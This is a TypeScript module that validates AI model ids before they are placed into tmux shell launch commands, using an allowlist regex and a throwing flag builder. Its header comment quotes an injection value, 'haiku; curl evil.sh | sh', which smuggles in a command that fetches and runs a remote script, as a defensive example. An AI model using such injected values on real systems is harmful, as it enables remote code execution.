// Model-id validation, shared by every driver.
//
// A model id ends up inside a command STRING, not an argv array: the runtime
// hands tmux `new-session <command>`, and tmux runs that through /bin/sh —
// which is exactly why the `; echo $? > …` completion suffix works. So an
// unvalidated model id is a shell injection (`haiku; curl evil.sh | sh`), and
// the value is attacker-reachable: it arrives from the creation wizard's
// free-text field, from POST /agents, and from the AI-generate path that
// fills agent fields from model output.
//
// Validation lives here, once, rather than in five driver copies.

/**
 * Model ids we accept. Deliberately permissive enough for every real id we
 * ship — `claude-opus`, `gpt-5-codex`, `anthropic/claude-sonnet` — and
 * nothing else. No spaces, quotes, or shell metacharacters.
 *
 * The leading character must be alphanumeric, which blocks two things at
 * once: a leading `-` smuggling an extra flag past the one we intended
 * (`--model=--dangerously-…`), and a leading `/` pointing at a binary.
 */
const MODEL_ID = /^[A-Za-z0-9][A-Za-z0-9._:/-]{0,63}$/;

export function isValidModelId(id: string): boolean {
  return MODEL_ID.test(id);
}

/**
 * The ` --model <id>` fragment for a launch command, or '' when the agent
 * has no opinion and the CLI's own default should stand.
 *
 * Throws on a malformed id rather than dropping the flag: silently falling
 * back to the default model is the same class of bug as the profile that
 * never reached the manifest — the run looks fine and is quietly wrong.
 */
export function modelFlag(model?: string): string {
  const id = model?.trim();
  if (!id || id === "default") return "";
  if (!isValidModelId(id)) {
    throw new Error(
      `Invalid model id ${JSON.stringify(id)}. Expected something like "claude-opus" or ` +
        '"anthropic/claude-sonnet": letters, digits, and . _ : / - only, starting with a letter or digit.',
    );
  }
  return ` --model ${id}`;
}
